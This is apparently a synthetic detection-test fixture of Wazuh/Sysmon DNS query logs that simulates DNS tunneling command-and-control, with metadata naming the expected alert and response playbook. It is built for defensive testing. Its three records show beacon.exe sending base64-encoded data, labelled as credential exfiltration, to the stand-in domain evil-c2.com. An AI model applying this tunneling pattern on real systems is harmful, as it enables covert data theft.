{
  "_metadata": {
    "attack_id": "T1071.004",
    "variation": "001",
    "name": "DNS Tunneling C2",
    "description": "Data exfiltration and C2 via DNS queries with encoded data",
    "expected_detection": "HIGH",
    "expected_soar": "c2-beaconing-detection",
    "kill_chain_phase": "command-and-control",
    "notes": "Long DNS queries with high entropy indicate tunneling",
    "format": "wazuh-native",
    "format_version": "1.0"
  },
  "logs": [
    {
      "_comment": "Sysmon Event 22 - Suspicious long DNS query 1",
      "sequence": 1,
      "timestamp": "2026-01-29T14:45:00.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: DNS Tunneling C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.004"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "DNS Tunneling C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.791580901",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 14:45:00.000",
              "processGuid": "{DNS-001-0001-0001-000000000001}",
              "processId": "14500",
              "image": "C:\\Users\\Public\\beacon.exe",
              "queryName": "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.data.evil-c2.com",
              "queryStatus": "0",
              "queryResults": "type:  5 aGVsbG8gd29ybGQgdGhpcyBpcyBhIHRlc3Q.data.evil-c2.com;185.234.218.100;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 22 - Suspicious long DNS query 2",
      "sequence": 2,
      "timestamp": "2026-01-29T14:45:05.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: DNS Tunneling C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.004"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "DNS Tunneling C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.560224066",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 14:45:05.000",
              "processGuid": "{DNS-001-0001-0001-000000000001}",
              "processId": "14500",
              "image": "C:\\Users\\Public\\beacon.exe",
              "queryName": "c2VuZGluZyBzZW5zaXRpdmUgZGF0YSBvdXQ.data.evil-c2.com",
              "queryStatus": "0",
              "queryResults": "type:  5 c2VuZGluZyBzZW5zaXRpdmUgZGF0YSBvdXQ.data.evil-c2.com;185.234.218.100;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    },
    {
      "_comment": "Sysmon Event 22 - Suspicious long DNS query 3",
      "sequence": 3,
      "timestamp": "2026-01-29T14:45:10.000Z",
      "log": {
        "timestamp": "",
        "rule": {
          "level": 12,
          "description": "Sysmon - Event 22: DNS Tunneling C2",
          "id": "100100",
          "mitre": {
            "id": [
              "T1071.004"
            ],
            "tactic": [
              "Command and Control"
            ],
            "technique": [
              "DNS Tunneling C2"
            ]
          },
          "firedtimes": 1,
          "mail": false,
          "groups": [
            "sysmon",
            "sysmon_event22",
            "windows"
          ]
        },
        "agent": {
          "id": "007",
          "name": "WS01",
          "ip": "10.1.0.20"
        },
        "manager": {
          "name": "wazuh.manager"
        },
        "id": "1700000000.593810987",
        "decoder": {
          "name": "windows_eventchannel"
        },
        "location": "EventChannel",
        "data": {
          "win": {
            "system": {
              "eventID": "22",
              "channel": "Microsoft-Windows-Sysmon/Operational",
              "providerName": "Microsoft-Windows-Sysmon",
              "computer": "WS01.corp.local",
              "level": "4",
              "task": "1",
              "opcode": "0",
              "keywords": "0x8000000000000000",
              "severityValue": "INFORMATION"
            },
            "eventdata": {
              "utcTime": "2026-01-29 14:45:10.000",
              "processGuid": "{DNS-001-0001-0001-000000000001}",
              "processId": "14500",
              "image": "C:\\Users\\Public\\beacon.exe",
              "queryName": "ZXhmaWx0cmF0aW5nIGNyZWRlbnRpYWxz.data.evil-c2.com",
              "queryStatus": "0",
              "queryResults": "type:  5 ZXhmaWx0cmF0aW5nIGNyZWRlbnRpYWxz.data.evil-c2.com;185.234.218.100;",
              "user": "CORP\\john.doe"
            }
          }
        }
      }
    }
  ]
}